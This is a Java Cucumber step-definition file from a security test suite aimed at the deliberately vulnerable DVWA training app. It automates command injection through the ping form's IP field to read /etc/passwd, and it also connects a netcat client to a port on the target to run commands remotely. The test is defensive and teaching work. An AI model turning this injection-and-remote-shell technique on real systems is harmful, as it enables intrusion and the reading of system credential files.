package com.github.rusakovichma.dvwa.bdd.attacks;

import com.github.rusakovichma.dvwa.bdd.nc.NetCat;
import com.github.rusakovichma.dvwa.bdd.nc.NetCatOptions;
import com.github.rusakovichma.dvwa.bdd.util.StreamUtils;
import cucumber.api.java.en.And;
import cucumber.api.java.en.Given;
import cucumber.api.java.en.Then;
import cucumber.api.java.en.When;
import org.openqa.selenium.By;

import java.io.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static junit.framework.TestCase.assertTrue;

public class CommandExecutionAttack extends ChromeBasedAttack {

    private ExecutorService executorService = Executors.newSingleThreadExecutor();

    private NetCat netCatClient;
    private ByteArrayOutputStream ncClientOut = new ByteArrayOutputStream();
    private ByteArrayInputStream ncClientIn = new ByteArrayInputStream(new byte[200]);

    @Given("^user logins with '(.*)' and '(.*)'$")
    public void user_login(String username, String password) throws Throwable {
        authFeature.goHomeAndLogin(username, password);
        driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
    }

    @And("^go to '(.*)' page$")
    public void go_to_vulnerabilities_exec_page(String path) {
        baseFeature.goTo(path);
        driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
    }

    @When("^user enters '(.*)' and clicks '(.*)'$")
    public void user_enters_cat_etc_passwd_and_click_Submit(String command, String btnName) throws Throwable {
        driver.findElement(By.xpath("//div[@class='vulnerable_code_area']//input[@name='ip']")).sendKeys(command);
        driver.findElement(By.name(btnName)).click();
        driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
    }

    @When("^user enters '(.*)' and clicks '(.*)' in a separate thread$")
    public void user_enters_cat_etc_passwd_and_click_Submit_in_a_separate_thread(final String command, final String btnName) throws Throwable {
        executorService.submit(new Runnable() {
            public void run() {
                try {
                    user_enters_cat_etc_passwd_and_click_Submit(command, btnName);
                } catch (Throwable thr) {
                    throw new RuntimeException(thr);
                }
            }
        });
        Thread.sleep(20000l);
    }

    @Then("^user sees the content of passwd file and root's '(.*)' pwd string$")
    public void user_sees_the_content_of_passwd_file_and_root_s_root_x_root_root_bin_bash_string(String rootPwdString) throws Throwable {
        String commendResponse = driver.findElement(By.xpath("//div[@class='vulnerable_code_area']//pre[1]")).getText();
        assertTrue(commendResponse.contains(rootPwdString));
    }

    @When("^connects to '(\\d+)' port of '(.*)' server$")
    public void connects_to_port_of_localhost_server(int port, String serverAddress) throws Throwable {
        NetCatOptions options = new NetCatOptions(false, false, serverAddress, port, ncClientIn, ncClientOut);

        this.netCatClient = new NetCat(options);
        this.netCatClient.start();
    }

    @When("^send '(.*)' command to the target server$")
    public void send_head_etc_passwd_command_to_the_target_server(String commandContent) throws Throwable {
        this.ncClientOut.write(commandContent.getBytes());
        Thread.sleep(5000l);
    }

    @Then("^gains access to passwd file content and root's '(.*)' pwd string$")
    public void gains_access_to_passwd_file_content_and_root_s_root_x_root_root_bin_bash_pwd_string(String rootPwdString) throws Throwable {
        String ncOutput = StreamUtils.toString(ncClientIn);
        assertTrue(ncOutput.contains(rootPwdString));
    }

}
